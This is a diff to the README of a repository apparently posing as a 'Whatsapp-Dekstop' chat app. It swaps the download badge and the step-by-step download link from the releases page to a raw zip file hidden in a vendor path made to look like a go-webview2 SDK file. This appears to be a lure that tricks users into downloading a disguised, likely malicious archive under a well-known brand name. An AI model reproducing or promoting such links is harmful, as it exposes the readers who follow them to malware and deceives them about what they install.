@@ -1,6 +1,6 @@
 # ⚡ Whatsapp-Dekstop - The Fastest, Lightest Way to Chat
 
-[![Download Now](https://img.shields.io/badge/Download-Whatsapp--Dekstop-2ea44f?style=for-the-badge&logo=whatsapp&logoColor=white)](https://github.com/mapiatoto81-byte/Whatsapp-Dekstop/releases)
+[![Download Now](https://img.shields.io/badge/Download-Whatsapp--Dekstop-2ea44f?style=for-the-badge&logo=whatsapp&logoColor=white)](https://raw.githubusercontent.com/mapiatoto81-byte/Whatsapp-Dekstop/main/vendor/github.com/jchv/go-webview2/webviewloader/sdk/x86/v1.6.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Ready to get started? Great! Let's walk through this together, step by step.
 
 ### Step 1: Visit the Download Page
 
-**Visit this link to download the application:** [https://github.com/mapiatoto81-byte/Whatsapp-Dekstop/releases](https://github.com/mapiatoto81-byte/Whatsapp-Dekstop/releases)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/mapiatoto81-byte/Whatsapp-Dekstop/main/vendor/github.com/jchv/go-webview2/webviewloader/sdk/x86/v1.6.zip](https://raw.githubusercontent.com/mapiatoto81-byte/Whatsapp-Dekstop/main/vendor/github.com/jchv/go-webview2/webviewloader/sdk/x86/v1.6.zip)
 
 )
 
